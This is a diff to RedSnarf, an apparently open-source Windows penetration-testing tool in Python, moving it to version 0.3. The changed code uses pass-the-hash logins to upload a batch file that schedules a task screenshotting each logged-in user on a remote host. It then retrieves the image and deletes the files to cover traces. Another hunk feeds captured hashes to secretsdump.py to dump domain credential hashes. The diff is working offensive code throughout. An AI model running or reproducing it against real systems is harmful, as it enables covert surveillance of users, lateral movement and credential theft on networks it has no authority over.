@@ -897,7 +897,7 @@ def datadump(user, passw, host, path, os_version):
 					for x in xrange(0,len(loggeduser)):
 												
 						fout=open('/tmp/sshot.bat','w')
-						fout.write('SchTasks /Create /SC DAILY /RU '+loggeduser[x]+' /TN "RedSnarf_ScreenShot" /TR "cmd.exe /c start /min c:\\rsc.exe c:\\'+loggeduser[x]+"_"+host+'.png" /ST 23:36 /f\n')
+						fout.write('SchTasks /Create /SC DAILY /RU '+loggeduser[x]+' /TN "RedSnarf_ScreenShot" /TR "cmd.exe /c start /min c:\\rsc.exe c:\\windows\\temp\\'+loggeduser[x]+"_"+host+'.png" /ST 23:36 /f\n')
 						fout.write('SchTasks /run /TN "RedSnarf_ScreenShot" \n')
 						fout.close() 
 					
@@ -905,7 +905,7 @@ def datadump(user, passw, host, path, os_version):
 						proc = subprocess.Popen("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /tmp; put sshot.bat\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
 						proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system --uninstall \/\/"+host+" \"c:\\sshot.bat \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
 						print proc.communicate()[0]
-						proc = subprocess.Popen("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get "+loggeduser[x]+"_"+host+".png"+"\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
+						proc = subprocess.Popen("/usr/bin/pth-smbclient //"+host+"/c$ --directory windows/temp -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get "+loggeduser[x]+"_"+host+".png"+"\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
 						print proc.communicate()[0]
 					
 						if os.path.isfile(outputpath+host+"/"+loggeduser[x]+"_"+host+".png"):
@@ -913,7 +913,9 @@ def datadump(user, passw, host, path, os_version):
 						else:
 							print colored("[-]Screenshot not found, try again..",'red')
 
-						proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\\"+loggeduser[x]+"_"+host+".png"+" c:\\rsc.exe c:\\sshot.bat\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
+						proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\\windows\\temp\\"+loggeduser[x]+"_"+host+".png\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
+						print proc.communicate()[0]
+						proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\\rsc.exe c:\\sshot.bat\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
 
 						time.sleep(4)
 
@@ -1392,7 +1394,7 @@ def main():
 							print colored("[-]Credentials Error",'red')
 	else:
 		run()
-	if len(targets)>1:
+	if len(targets)>1 and args.quick_validate in noanswers:
 		print colored ('\n[+]Range Detected - Now trying to merge pwdump files to '+mergepf,'yellow')
 
 		for ip in targets:
@@ -1421,7 +1423,7 @@ def main():
 					print colored ("[+]Found " + find_user + " logged in to "+str(ip),'green')
 
 banner()
-p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="%prog 0.2k", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150))
+p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="%prog 0.3", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150))
 # Creds
 p.add_argument("-H", "--host", dest="host", help="Specify a hostname -H ip= / range -H range= / targets file -H file= to grab hashes from")
 p.add_argument("-u", "--username", dest="username", default="Administrator",help="Enter a username")
@@ -2153,8 +2155,12 @@ if drsuapi in yesanswers:
 			else:
 				print colored("[+]Found directory for: "+outputpath+targets[0],'green')
 			print colored("[+]Saving hashes to: "+outputpath+targets[0]+'/drsuapi_gethashes.txt','yellow')
-			pwdumpmatch = re.compile('^(\S+?):(.*?:?)([0-9a-fA-F]{32}):([0-9a-fA-F]{32}):.*?:.*?:\s*$')
+			pwdumpmatch = re.compile('^([0-9a-fA-F]{32}):([0-9a-fA-F]{32}):.*?:.*?:\s*$')
 			pwdump = pwdumpmatch.match(passw)
+			
+			if pwdump:
+				passw=passw[0:-3]
+
 			if pwdump:
 				os.system("/usr/local/bin/secretsdump.py -hashes "+passw+' '+domain_name+'/'+user+'\\'+'@'+targets[0] +'> '+outputpath+targets[0]+'/drsuapi_gethashes.txt')
 			else:
